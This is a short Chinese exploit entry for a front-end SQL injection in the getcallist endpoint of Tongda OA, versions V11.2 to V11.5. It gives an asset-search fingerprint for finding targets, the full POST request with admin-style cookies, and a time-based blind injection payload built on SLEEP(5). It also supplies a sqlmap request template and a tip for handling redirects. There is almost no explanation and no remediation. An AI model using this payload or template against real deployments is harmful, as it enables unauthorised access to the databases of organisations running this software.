# 通达OAgetcallist存在前台SQL注入漏洞

- **系统**：通达OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`POST /general/appbuilder/web/calendar/calendarlist/getcallist HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Type: application/x-www-form-urlencoded`　`Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=f4f833d3; UI_COOKIE=0; PHPSESSID…`　`Content-Length: 0`

**请求体 / payload**
```
starttime=1' AND (SELECT 7846 FROM (SELECT(SLEEP(5)))SfMD) AND 'GpBS'='GpBS&endtime=1598918400&view=month&condition=1

sqlmap
POST /general/appbuilder/web/calendar/calendarlist/getcallist HTTP/1.1
Host: {hostname}
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
starttime=1&endtime=1598918400&view=month&condition=1
注意：sqlmap遇到302跳转，选择`n`\

```

**其他**
- 通达OA getcallist存在前台SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通达OAV11.2-通达OAV11.5